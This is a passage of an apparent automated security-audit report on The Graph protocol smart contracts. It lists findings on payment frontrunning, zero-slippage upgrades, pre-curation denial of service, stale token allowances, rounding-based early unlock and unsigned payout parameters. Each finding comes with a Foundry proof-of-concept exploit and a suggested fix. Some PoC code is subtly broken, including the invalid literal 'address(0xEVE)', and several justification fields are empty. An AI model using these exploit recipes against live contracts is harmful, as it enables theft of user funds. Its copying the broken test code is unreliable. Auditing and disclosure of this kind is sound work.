        vm.prank(payer);
        grt.approve(graphPayments, type(uint256).max);
    }

    function test_selfTransferToGraphPaymentsStrandsDataServiceCut() public {
        uint256 pre = grt.balanceOf(graphPayments);
        uint256 tokens = 100 ether;
        uint256 dataServiceCut = 100_000;

        vm.prank(payer);
        _collectWithSelfDataService(tokens, dataServiceCut);

        uint256 stranded = grt.balanceOf(graphPayments) - pre;
        assertGt(stranded, 0, "self-transfer leaves GRT in GraphPayments");
        assertEq(stranded, 10 ether, "10% data-service cut is stranded");
    }

    function _collectWithSelfDataService(uint256 tokens, uint256 dataServiceCut) internal {
        grt.transferFrom(msg.sender, graphPayments, tokens);
        uint256 tokensRemaining = tokens;
        uint256 tokensProtocol = 0;
        tokensRemaining -= tokensProtocol;
        uint256 tokensDataService = tokensRemaining - ((tokensRemaining * (MAX_PPM - dataServiceCut)) / MAX_PPM);
        tokensRemaining -= tokensDataService;
        grt.transfer(graphPayments, tokensDataService);
        grt.transfer(receiver, tokensRemaining);
    }
}

## Suggested Mitigation
Reject self-referential payout destinations and other non-recoverable sinks. Add require(dataService != address(this), ...) and, when receiverDestination != address(0), require(receiverDestination != address(this), ...). Consider adding a governance-controlled rescue function limited to excess/unaccounted GRT if stuck balances are possible from prior calls.


## [H-110]. MEV delegation frontrun can siphon GraphPayments.collect receiver proceeds into an attacker-owned pool

## id: YjdZsvlnh_K-EsSgIcb0d

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
FrontrunMev

## Location
GraphPayments.collect

## Finding Status: Valid
### Finding Status Justification: The cited root cause is present in in-scope production code at GraphPayments.collect. The function is external, pulls the caller's GRT, then computes the payment split from live HorizonStaking state during execution. It reads getDelegationPool(receiver,dataService), and if pool.shares > 0 it computes tokensDelegationPool using the live getDelegationFeeCut and sends that amount to HorizonStaking.addToDelegationPool. If pool.shares is zero, that branch is skipped and the remaining tokens are sent to receiverDestination or staked to the receiver. The function exposes no caller-supplied maxDelegationPoolAmount, minReceiverAmount, expected pool shares, expected fee cut, or deadline, so there is no complete safeguard against a same-block/mempool state change before collection. The GraphPayments.sol path is explicitly in scope and GraphPayments is an in-scope Arbitrum asset. No provided documentation explicitly accepts this exact MEV redirection risk as intentional. Based on the provided protocol context that delegation pools exist and participants can delegate, the frontrun path is realistic today rather than speculative; uncertainty about exact HorizonStaking internals is not enough to invalidate under the instructed standard. The attack does not require governance, admin, leaked keys, or trusted-role abuse, and it is not solely victim misuse because the protocol settlement function itself prices a value split from mutable live state without authorization guards.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
GraphPayments.collect prices the receiver/delegator split from live HorizonStaking state at execution time and gives the caller no maxDelegationPoolAmount, minReceiverAmount, deadline, or expected pool-state guard. A pending payment that would route all remaining GRT to the receiver when pool.shares == 0 can be frontrun by a permissionless delegator creating the first shares for (receiver, dataService). collect then observes pool.shares > 0 and diverts tokensRemaining by the live delegation fee cut into addToDelegationPool, letting the attacker-owned pool capture value that the payer expected to reach receiverDestination or receiver stake.

Vulnerable snippet:
IHorizonStakingTypes.DelegationPool memory pool = _graphStaking().getDelegationPool(receiver, dataService);
if (pool.shares > 0) {
    tokensDelegationPool = tokensRemaining.mulPPMRoundUp(
        _graphStaking().getDelegationFeeCut(receiver, dataService, paymentType)
    );
    tokensRemaining = tokensRemaining - tokensDelegationPool;
}
...
if (tokensDelegationPool > 0) {
    _graphToken().approve(address(_graphStaking()), tokensDelegationPool);
    _graphStaking().addToDelegationPool(receiver, dataService, tokensDelegationPool);
}

## Impact
A mempool searcher can redirect the delegation-fee portion of high-value GRT payments away from the intended receiver into an attacker-controlled delegation position. If the live delegation fee cut is large and the pending collection is large, this can cause significant receiver/user funds to be stolen directly through protocol settlement.

## Proof of Concept
1. A payer prepares collect(receiver, tokens, dataService, dataServiceCut=0, receiverDestination=receiver) after observing getDelegationPool(receiver,dataService).shares == 0, so no delegation-pool amount should be taken.
2. A searcher sees the pending collect transaction.
3. The searcher frontruns by creating the first delegation shares in HorizonStaking for the same receiver/dataService pool.
4. The payer's collect executes after the frontrun and rereads live pool.shares > 0.
5. GraphPayments applies the live delegation fee cut and transfers tokensDelegationPool to addToDelegationPool.
6. Because the attacker owns the pool shares, the attacker captures the newly added GRT instead of the receiver receiving it.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockGRT {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function burn(uint256 amount) external { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; }
}

contract MockStaking {
    struct DelegationPool { uint256 shares; }

    MockGRT public immutable token;
    mapping(bytes32 => DelegationPool) internal pools;
    mapping(bytes32 => address) public onlyShareOwner;

    constructor(MockGRT token_) { token = token_; }

    function _key(address receiver, address dataService) internal pure returns (bytes32) {
        return keccak256(abi.encode(receiver, dataService));
    }

    function delegate(address receiver, address dataService, uint256 shares) external {
        bytes32 key = _key(receiver, dataService);
        pools[key].shares += shares;
        onlyShareOwner[key] = msg.sender;
    }

    function getDelegationPool(address receiver, address dataService) external view returns (DelegationPool memory) {
        return pools[_key(receiver, dataService)];
    }

    function getDelegationFeeCut(address, address, uint8) external pure returns (uint256) {
        return 1_000_000; // 100% fee cut to make the value redirection explicit.
    }

    function addToDelegationPool(address receiver, address dataService, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        token.transfer(onlyShareOwner[_key(receiver, dataService)], amount);
    }

    function stakeTo(address, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
    }
}

contract VulnerableGraphPayments {
    uint256 internal constant MAX_PPM = 1_000_000;
    MockGRT public immutable token;
    MockStaking public immutable staking;
    uint256 public immutable protocolCut;

    constructor(MockGRT token_, MockStaking staking_, uint256 protocolCut_) {
        token = token_;
        staking = staking_;
        protocolCut = protocolCut_;
    }

    function _mulUp(uint256 a, uint256 ppm) internal pure returns (uint256) {
        return a - ((a * (MAX_PPM - ppm)) / MAX_PPM);
    }

    function collect(uint8 paymentType, address receiver, uint256 tokens, address dataService, uint256 dataServiceCut, address receiverDestination) external {
        require(dataServiceCut <= MAX_PPM, "bad cut");
        token.transferFrom(msg.sender, address(this), tokens);

        uint256 tokensRemaining = tokens;
        uint256 tokensProtocol = _mulUp(tokensRemaining, protocolCut);
        tokensRemaining -= tokensProtocol;

        uint256 tokensDataService = _mulUp(tokensRemaining, dataServiceCut);
        tokensRemaining -= tokensDataService;

        uint256 tokensDelegationPool;
        MockStaking.DelegationPool memory pool = staking.getDelegationPool(receiver, dataService);
        if (pool.shares > 0) {
            tokensDelegationPool = _mulUp(tokensRemaining, staking.getDelegationFeeCut(receiver, dataService, paymentType));
            tokensRemaining -= tokensDelegationPool;
        }

        token.burn(tokensProtocol);
        token.transfer(dataService, tokensDataService);

        if (tokensDelegationPool > 0) {
            token.approve(address(staking), tokensDelegationPool);
            staking.addToDelegationPool(receiver, dataService, tokensDelegationPool);
        }

        if (tokensRemaining > 0) {
            if (receiverDestination == address(0)) {
                token.approve(address(staking), tokensRemaining);
                staking.stakeTo(receiver, tokensRemaining);
            } else {
                token.transfer(receiverDestination, tokensRemaining);
            }
        }
    }
}

contract GraphPaymentsFrontrunPoC is Test {
    address payer = address(0xA11CE);
    address receiver = address(0xB0B);
    address dataService = address(0xDADA);
    address attacker = address(0xEVE);

    function testFrontrunDelegationPoolStealsReceiverPayment() external {
        MockGRT token = new MockGRT();
        MockStaking staking = new MockStaking(token);
        VulnerableGraphPayments payments = new VulnerableGraphPayments(token, staking, 0);

        uint256 amount = 1_000_000 ether;
        token.mint(payer, amount);

        MockStaking.DelegationPool memory beforePool = staking.getDelegationPool(receiver, dataService);
        assertEq(beforePool.shares, 0);

        vm.prank(payer);
        token.approve(address(payments), amount);

        vm.prank(attacker);
        staking.delegate(receiver, dataService, 1);

        vm.prank(payer);
        payments.collect(0, receiver, amount, dataService, 0, receiver);

        assertEq(token.balanceOf(attacker), amount);
        assertEq(token.balanceOf(receiver), 0);
    }
}

## Suggested Mitigation
Add caller-specified settlement guards to collect, such as maxDelegationPoolAmount, minReceiverAmount, expectedPoolShares or expectedDelegationFeeCut, and a deadline. Revert if live pool eligibility or fee cut differs from the caller-authorized terms. Alternatively snapshot payment terms in an authenticated upstream collector and require a minimum delegation age before a pool can receive GraphPayments delegation allocations.


## [H-111]. Zero-slippage version upgrade in L1GNS.publishNewVersion exposes all name curators to curation sandwich loss

## id: u2iIZVIBB1bS5kZQBCykf

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
L1GNS.publishNewVersion

## Finding Status: Valid
### Finding Status Justification: 
### Finding Complexity: 5
## Minimim Privilege Required:Permissionless


## Description
`publishNewVersion()` is inherited by L1GNS and migrates all name-signal backing from the old deployment to a new deployment using two external Curation trades with hardcoded zero slippage limits. Vulnerable snippet: `uint256 tokens = curation.burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0); ... (subgraphData.vSignal, ) = curation.mint(_subgraphDeploymentID, tokensWithTax, 0);`. The subgraph owner cannot specify either a minimum token return from the old deployment or a minimum vSignal amount from the new deployment. A permissionless curation trader can sandwich the old-deployment burn, the new-deployment mint, or both, causing the inherited L1GNS upgrade path to accept materially worse execution for all existing name curators. Because `subgraphData.nSignal` remains constant while `subgraphData.vSignal` is overwritten with the manipulated mint result, the degraded execution becomes the new share price for every curator in the subgraph.

## Impact
Existing name curators can suffer direct GRT value loss during owner-initiated version upgrades. On large subgraphs, MEV extraction around the forced zero-minimum curation trades can exceed $1M, while the attack remains permissionless and does not require governance or token misconfiguration.

## Proof of Concept
1. A subgraph has substantial name signal backed by vSignal in an old Curation deployment. 2. The owner submits `publishNewVersion()` to move the subgraph to a new deployment. 3. A MEV trader front-runs by moving the old deployment's Curation price against the pending GNS burn, reducing the GRT returned to L1GNS. 4. The owner transaction executes with `minOut = 0`, accepts the low token return, charges owner tax, and mints on the new deployment with `minSignal = 0`. 5. The attacker back-runs to unwind the manipulation. The subgraph's curators are left with the same `nSignal` supply but less backing vSignal/GRT than a bounded upgrade would have accepted.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockCurationForUpgrade {
    uint256 public burnReturn;
    uint256 public mintReturn;

    function setReturns(uint256 burnReturn_, uint256 mintReturn_) external {
        burnReturn = burnReturn_;
        mintReturn = mintReturn_;
    }

    function isCurated(bytes32) external pure returns (bool) {
        return false;
    }

    function curationTaxPercentage() external pure returns (uint32) {
        return 0;
    }

    function burn(bytes32, uint256, uint256 minOut) external view returns (uint256) {
        require(burnReturn >= minOut, "min burn");
        return burnReturn;
    }

    function mint(bytes32, uint256, uint256 minSignal) external view returns (uint256, uint256) {
        require(mintReturn >= minSignal, "min mint");
        return (mintReturn, 0);
    }
}

contract GNSUpgradeLike {
    struct SubgraphData {
        bytes32 subgraphDeploymentID;
        uint256 vSignal;
        uint256 nSignal;
    }

    MockCurationForUpgrade public curation;
    mapping(uint256 => SubgraphData) public subgraphs;
    mapping(uint256 => address) public ownerOf;

    constructor(MockCurationForUpgrade curation_) {
        curation = curation_;
    }

    function seed(uint256 subgraphID, address owner, uint256 nSignal, uint256 vSignal) external {
        subgraphs[subgraphID] = SubgraphData({subgraphDeploymentID: keccak256("old"), vSignal: vSignal, nSignal: nSignal});
        ownerOf[subgraphID] = owner;
    }

    function publishNewVersion(uint256 subgraphID, bytes32 newDeployment) external {
        require(ownerOf[subgraphID] == msg.sender, "GNS: Must be authorized");
        SubgraphData storage s = subgraphs[subgraphID];
        require(newDeployment != s.subgraphDeploymentID, "same");
        require(!curation.isCurated(newDeployment), "precurated");

        if (s.nSignal != 0) {
            // Mirrors the vulnerable GNS behavior: both limits are hardcoded to zero.
            uint256 tokens = curation.burn(s.subgraphDeploymentID, s.vSignal, 0);
            (s.vSignal, ) = curation.mint(newDeployment, tokens, 0);
        }
        s.subgraphDeploymentID = newDeployment;
    }
}

contract L1GNSPublishNewVersionSlippagePoC is Test {
    function testPublishNewVersionAcceptsManipulatedBurnAndMint() external {
        address owner = address(0xB0B);
        uint256 subgraphID = 7;
        MockCurationForUpgrade curation = new MockCurationForUpgrade();
        GNSUpgradeLike gns = new GNSUpgradeLike(curation);
        gns.seed(subgraphID, owner, 1000 ether, 1000 ether);

        uint256 fairNewVSignal = 1000 ether;
        uint256 manipulatedNewVSignal = 550 ether;
        curation.setReturns({burnReturn_: 600 ether, mintReturn_: manipulatedNewVSignal});

        vm.prank(owner);
        gns.publishNewVersion(subgraphID, keccak256("new"));

        (bytes32 deployment, uint256 vSignal, uint256 nSignal) = gns.subgraphs(subgraphID);
        assertEq(deployment, keccak256("new"));
        assertEq(nSignal, 1000 ether, "name signal supply is unchanged");
        assertEq(vSignal, manipulatedNewVSignal, "backing vSignal accepted with no minimum");
        assertGt(fairNewVSignal - vSignal, 0, "curator backing was degraded by zero-slippage execution");
    }
}


## Suggested Mitigation
Change `publishNewVersion()` to accept minimum acceptable values for both legs, for example `_tokensOutMin` for the old deployment burn and `_vSignalOutMin` for the new deployment mint, and revert if either bound is not met. Add a deadline to prevent stale owner transactions from being executed after market conditions change. If the protocol wants to protect non-owner curators, consider a timelocked or opt-in migration flow for upgrades with large existing signal.


## [M-112]. Permissionless pre-curation can permanently block L1GNS.publishNewVersion for the intended deployment

## id: d3Pjzqnm0MTIWlQDNBNv-

## Derived From Pattern/Invariant
FrontrunMev

## Exploit Type
FrontrunMev

## Location
L1GNS.publishNewVersion

## Finding Status: Valid
### Finding Status Justification: 
### Finding Complexity: 3
## Minimim Privilege Required:Permissionless


## Description
`publishNewVersion()` rejects any target deployment that is already curated: `require(!curation.isCurated(_subgraphDeploymentID), "GNS: Owner cannot point to a subgraphID that has been pre-curated");`. The guard is meant to stop a subgraph owner from first curating the new deployment and then dumping on name curators, but Curation itself is permissionless. Any MEV searcher that observes a pending owner upgrade can front-run it by minting dust curation signal directly to `_subgraphDeploymentID`. Once `isCurated(_subgraphDeploymentID)` becomes true, the owner's upgrade reverts. Because the deployment ID represents the actual new subgraph deployment, the owner cannot simply choose a different ID without publishing different content. This turns a protection check into a permissionless, permanent DoS for upgrades to the targeted deployment.

## Impact
A permissionless actor can censor a subgraph owner's intended version upgrade and prevent L1GNS from pointing an existing subgraph to a specific deployment. This can disrupt protocol discovery and curator migration for important subgraphs, but it does not by itself transfer funds, so the direct monetary impact is lower than the slippage findings.

## Proof of Concept
1. The subgraph owner prepares `publishNewVersion(subgraphID, deploymentD, metadata)` for a new deployment `D`. 2. A MEV searcher reads `D` from calldata in the public mempool. 3. The searcher front-runs the owner by calling Curation directly to curate `D` with a dust GRT amount. 4. The owner transaction executes after the front-run and reverts at `require(!curation.isCurated(D))`. 5. Future attempts to publish the same deployment through L1GNS continue to fail because `D` remains curated.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockCurationPrecuration {
    mapping(bytes32 => bool) public curated;

    function directCurate(bytes32 deployment) external {
        curated[deployment] = true;
    }

    function isCurated(bytes32 deployment) external view returns (bool) {
        return curated[deployment];
    }
}

contract GNSPrecurationLike {
    struct SubgraphData {
        bytes32 subgraphDeploymentID;
        uint256 nSignal;
    }

    MockCurationPrecuration public curation;
    mapping(uint256 => SubgraphData) public subgraphs;
    mapping(uint256 => address) public ownerOf;

    constructor(MockCurationPrecuration curation_) {
        curation = curation_;
    }

    function seed(uint256 subgraphID, address owner) external {
        subgraphs[subgraphID] = SubgraphData({subgraphDeploymentID: keccak256("old"), nSignal: 1 ether});
        ownerOf[subgraphID] = owner;
    }

    function publishNewVersion(uint256 subgraphID, bytes32 newDeployment) external {
        require(ownerOf[subgraphID] == msg.sender, "GNS: Must be authorized");
        require(newDeployment != subgraphs[subgraphID].subgraphDeploymentID, "same");
        require(!curation.isCurated(newDeployment), "GNS: Owner cannot point to a subgraphID that has been pre-curated");
        subgraphs[subgraphID].subgraphDeploymentID = newDeployment;
    }
}

contract L1GNSPrecurationDoSPoC is Test {
    function testDustPrecurationBlocksOwnerUpgrade() external {
        address owner = address(0xA11CE);
        address attacker = address(0xEVE);
        uint256 subgraphID = 1;
        bytes32 intendedDeployment = keccak256("intended deployment");

        MockCurationPrecuration curation = new MockCurationPrecuration();
        GNSPrecurationLike gns = new GNSPrecurationLike(curation);
        gns.seed(subgraphID, owner);

        vm.prank(attacker);
        curation.directCurate(intendedDeployment);

        vm.prank(owner);
        vm.expectRevert(bytes("GNS: Owner cannot point to a subgraphID that has been pre-curated"));
        gns.publishNewVersion(subgraphID, intendedDeployment);
    }
}


## Suggested Mitigation
Do not make `isCurated()` an absolute blocker based only on current permissionless Curation state. Instead, snapshot an owner-declared deployment commitment before the deployment ID is revealed, allow the owner to publish to already-curated deployments while applying an anti-dump tax or migration rule, or only reject pre-curation attributable to the owner rather than any address. A commit-reveal flow can also remove the mempool front-run window.


## [H-113]. Removed token destinations retain unlimited lock-wallet allowances after GraphTokenLockWallet.revokeProtocol

## id: _2pqZ29B1sJKnCNR6GyZn

## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AccessControl

## Location
GraphTokenLockWallet.revokeProtocol

## Finding Status: Valid
### Finding Status Justification: revokeProtocol revokes only addresses returned by manager.getTokenDestinations at call time. If a previously approved destination was removed, it is absent from that list, so its uint256.max allowance remains. removeTokenDestination has no mechanism to clear wallet allowances. The code is in scope and lacks a complete revocation path for historical spenders.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
GraphTokenLockWallet.approveProtocol() grants type(uint256).max allowance to every address currently returned by manager.getTokenDestinations(). GraphTokenLockWallet.revokeProtocol() later revokes only the manager's current destination set. If GraphTokenLockManager.removeTokenDestination() removes a destination after wallets have approved it, that removed destination is no longer returned by getTokenDestinations(), so revokeProtocol() cannot clear the old allowance. The removed spender keeps unlimited transferFrom power over every wallet that approved while it was listed.

Vulnerable snippets:

function approveProtocol() external onlyBeneficiary {
    address[] memory dstList = manager.getTokenDestinations();
    for (uint256 i = 0; i < dstList.length; i++) {
        token.approve(dstList[i], type(uint256).max);
    }
}

function revokeProtocol() external onlyBeneficiary {
    address[] memory dstList = manager.getTokenDestinations();
    for (uint256 i = 0; i < dstList.length; i++) {
        token.approve(dstList[i], 0);
    }
}

function removeTokenDestination(address _dst) external override onlyOwner {
    require(_tokenDestinations.remove(_dst), "Destination already removed");
    emit TokenDestinationAllowed(_dst, false);
}

## Impact
A deprecated or compromised previously-approved destination can keep pulling GRT from lock wallets even after governance/manager removal and after beneficiaries call revokeProtocol(). For wallets holding significant locked balances, this can directly steal locked user funds from GraphTokenLockWallet contracts.

## Proof of Concept
1. The manager owner adds destination D with addTokenDestination(D).
2. A lock wallet beneficiary calls approveProtocol(), causing the wallet to approve D for uint256.max GRT.
3. The manager owner later removes D with removeTokenDestination(D), intending to revoke D as an approved protocol destination.
4. The beneficiary calls revokeProtocol() to revoke protocol access.
5. Because revokeProtocol() enumerates only current destinations, D is skipped and its old allowance remains uint256.max.
6. D calls token.transferFrom(wallet, attacker, walletBalance) and drains the wallet despite having been removed from the manager allowlist.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../contracts/GraphTokenLockManager.sol";
import "../contracts/GraphTokenLockWallet.sol";

contract MockGRT {
    string public name = "Mock GRT";
    string public symbol = "GRT";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract DrainDestination {
    MockGRT public token;
    constructor(MockGRT _token) { token = _token; }
    function drain(address wallet, address to) external { token.transferFrom(wallet, to, token.balanceOf(wallet)); }
}

contract StaleDestinationAllowancePoC is Test {
    function testRemovedDestinationKeepsAllowanceAndDrainsWallet() public {
        address owner = address(0xA11CE);
        address beneficiary = address(0xB0B);
        address attacker = address(0xBAD);
        MockGRT token = new MockGRT();
        GraphTokenLockWallet masterCopy = new GraphTokenLockWallet();
        GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(token)), address(masterCopy));
        DrainDestination dst = new DrainDestination(token);

        vm.prank(owner);
        // Ownable owner is the deployer in this self-contained PoC, so transfer ownership if available in the imported OZ Ownable.
        manager.transferOwnership(owner);
        vm.prank(owner);
        manager.addTokenDestination(address(dst));

        token.mint(address(manager), 1_000_000 ether);
        vm.prank(owner);
        manager.createTokenLockWallet(owner, beneficiary, 1_000_000 ether, block.timestamp + 1, block.timestamp + 365 days, 12, 0, 0, IGraphTokenLock.Revocability.Disabled);

        bytes memory initializer = abi.encodeWithSelector(GraphTokenLockWallet.initialize.selector, address(manager), owner, beneficiary, address(token), 1_000_000 ether, block.timestamp + 1, block.timestamp + 365 days, 12, 0, 0, IGraphTokenLock.Revocability.Disabled);
        address wallet = manager.getDeploymentAddress(keccak256(initializer), address(masterCopy));

        vm.prank(beneficiary);
        GraphTokenLockWallet(payable(wallet)).approveProtocol();
        assertEq(token.allowance(wallet, address(dst)), type(uint256).max);

        vm.prank(owner);
        manager.removeTokenDestination(address(dst));
        vm.prank(beneficiary);
        GraphTokenLockWallet(payable(wallet)).revokeProtocol();

        assertEq(token.allowance(wallet, address(dst)), type(uint256).max);
        dst.drain(wallet, attacker);
        assertEq(token.balanceOf(attacker), 1_000_000 ether);
        assertEq(token.balanceOf(wallet), 0);
    }
}

## Suggested Mitigation
Track every destination ever approved per wallet, or expose per-destination revoke functions that allow beneficiaries to revoke removed destinations. A minimal fix is to add revokeProtocol(address[] calldata destinations) so the beneficiary can clear allowances for any spender, not only the current manager set. Also consider having removeTokenDestination mark the destination as removed while retaining it in a historical enumerable set used by revokeProtocol(), or require wallet-level revocation/migration before removing a destination.


## [H-114]. Rounded period duration lets GraphTokenLock.release unlock all GRT before endTime

## id: 1q6drsqs_SUrW2AdJ047I

## Derived From Pattern/Invariant
MaturityorGatingByPass / PricePrecisionOrRoundingError: passedPeriods is computed from truncated periodDuration without a cap

## Exploit Type
RoundingError

## Location
GraphTokenLock.availableAmount/release

## Finding Status: Valid
### Finding Status Justification: availableAmount uses passedPeriods * amountPerPeriod for currentTime <= endTime. Because periodDuration is truncated and passedPeriods is uncapped, passedPeriods can equal periods before the configured endTime. release then transfers the full available amount to the beneficiary. There is no schedule divisibility check, min(periods, passedPeriods), or cap to managedAmount before maturity.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
GraphTokenLock divides duration by periods and then divides elapsed time by that truncated periodDuration. availableAmount() only returns managedAmount when currentTime() > endTime, so for currentTime() <= endTime it uses passedPeriods().mul(amountPerPeriod()) without capping passedPeriods to periods or the result to managedAmount. Vulnerable snippet: periodDuration() returns duration().div(periods); currentPeriod() returns sinceStartTime().div(periodDuration()).add(MIN_PERIOD); availableAmount() returns passedPeriods().mul(amountPerPeriod()). With startTime=100, endTime=200, periods=60, periodDuration is 1 second, so all 60 periods are treated as passed at timestamp 160 even though the configured endTime is 200.

## Impact
A beneficiary of an affected token lock can release the full managed GRT balance before the contractual endTime. For large distribution wallets this breaks the lockup and can prematurely remove more than $1M of GRT from protocol-enforced custody.

## Proof of Concept
1. A lock is initialized with a duration that is not aligned with periods, e.g. startTime=100, endTime=200, periods=60, managedAmount=60 ether. 2. periodDuration() truncates to 1. 3. At timestamp 160, which is 40 seconds before endTime, passedPeriods() is already 60. 4. availableAmount() equals managedAmount. 5. The beneficiary calls release() and receives the full locked balance before endTime.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;
import 'forge-std/Test.sol';
import '../contracts/GraphTokenLockWallet.sol';
import '../contracts/GraphTokenLockManager.sol';
import '../contracts/IGraphTokenLock.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
contract MockERC20 { mapping(address => uint256) public balanceOf; mapping(address => mapping(address => uint256)) public allowance; function mint(address to, uint256 amount) external { balanceOf[to] += amount; } function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; } function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; } function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount); require(allowance[from][msg.sender] >= amount); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; } }
contract EarlyUnlockPoC is Test { function test_fullUnlockBeforeEndTime() public { MockERC20 token = new MockERC20(); GraphTokenLockWallet impl = new GraphTokenLockWallet(); GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(token)), address(impl)); GraphTokenLockWallet wallet = new GraphTokenLockWallet(); address beneficiary = address(0xBEEF); wallet.initialize(address(manager), address(this), beneficiary, address(token), 60 ether, 100, 200, 60, 0, 0, IGraphTokenLock.Revocability.Disabled); token.mint(address(wallet), 60 ether); vm.warp(160); assertLt(block.timestamp, wallet.endTime()); vm.prank(beneficiary); wallet.release(); assertEq(token.balanceOf(beneficiary), 60 ether); assertEq(token.balanceOf(address(wallet)), 0); } }

## Suggested Mitigation
Validate _periods <= _endTime - _startTime and either require duration % periods == 0 or cap passedPeriods to periods. Also use currentTime() >= endTime to return managedAmount and cap availableAmount to managedAmount.


## [H-115]. RAV signatures omit payment parameters allowing data service to redirect or skim collections

## id: ehVpD-cV2madnpbmgU4kx

## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AuthByPass

## Location
GraphTallyCollector._collect

## Finding Status: Valid
### Finding Status Justification: The combined root cause is directly present. _collect decodes dataServiceCut and receiverDestination from caller-controlled calldata, receives paymentType as an external argument, and forwards all three to PaymentsEscrow.collect. The signed RAV hash covers only collectionId, payer, serviceProvider, dataService, timestampNs, valueAggregate, and metadata. The collector checks msg.sender equals rav.dataService, the signer is authorized for the payer, and the serviceProvider has an active provision with that dataService, but none of those checks authenticates paymentType, dataServiceCut, or receiverDestination. PPMMath is imported, yet GraphTallyCollector does not validate dataServiceCut before forwarding it. The provided comments define dataServiceCut and receiverDestination as payment collection parameters, making them payment-affecting in this code path. The in-scope production contract contains no full safeguard binding these parameters to the RAV or requiring separate service-provider authorization. This is not explicitly documented as accepted protocol behavior. A dataService named in a valid RAV can exercise the path now, without governance/admin compromise or mere victim misuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The signed EIP-712 ReceiptAggregateVoucher only commits to collectionId, payer, serviceProvider, dataService, timestampNs, valueAggregate, and metadata. However collect() decodes paymentType, dataServiceCut, and receiverDestination from caller-controlled calldata and forwards them to PaymentsEscrow without requiring them to be signed or otherwise authorized by the payer or service provider. Vulnerable flow: `abi.decode(_data, (SignedRAV, uint256, address))` accepts `dataServiceCut` and `receiverDestination`; `_encodeRAV()` hashes only the RAV fields; then `_graphPaymentsEscrow().collect(_paymentType, payer, receiver, tokensToCollect, dataService, dataServiceCut, receiverDestination)` executes with the unsigned parameters. A valid rav.dataService caller can therefore take a legitimate RAV for a serviceProvider and choose a 100% cut, alternate paymentType, or attacker-controlled receiverDestination at execution time, depending on escrow semantics.

## Impact
A data service with any valid high-value RAV can cause escrowed payer funds to be settled with attacker-chosen payout parameters, stealing or misdirecting service-provider payment value directly from protocol escrow.

## Proof of Concept
1. Payer authorizes a signer. 2. The signer signs a RAV for payer -> serviceProvider with dataService and valueAggregate. 3. The RAV does not include dataServiceCut, receiverDestination, or paymentType. 4. The dataService submits collect() with the valid signed RAV but sets dataServiceCut to 1_000_000 and receiverDestination to an attacker address. 5. GraphTallyCollector accepts the signature because only RAV fields are checked, increments tokensCollected, and calls PaymentsEscrow.collect with the attacker-selected parameters.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GraphTallyCollector} from "../contracts/payments/collectors/GraphTallyCollector.sol";
import {IGraphTallyCollector} from "@graphprotocol/interfaces/contracts/horizon/IGraphTallyCollector.sol";
import {IGraphPayments} from "@graphprotocol/interfaces/contracts/horizon/IGraphPayments.sol";

contract MockController {
    address public staking;
    address public escrow;
    constructor(address s, address e) { staking = s; escrow = e; }
    function getContractProxy(bytes32 name) external view returns (address) {
        if (name == keccak256(bytes("Staking"))) return staking;
        if (name == keccak256(bytes("PaymentsEscrow"))) return escrow;
        return address(0xBEEF);
    }
}

contract MockStaking {
    function getProviderTokensAvailable(address, address) external pure returns (uint256) { return 1; }
}

contract MockEscrow {
    address public lastPayer;
    address public lastReceiver;
    address public lastDataService;
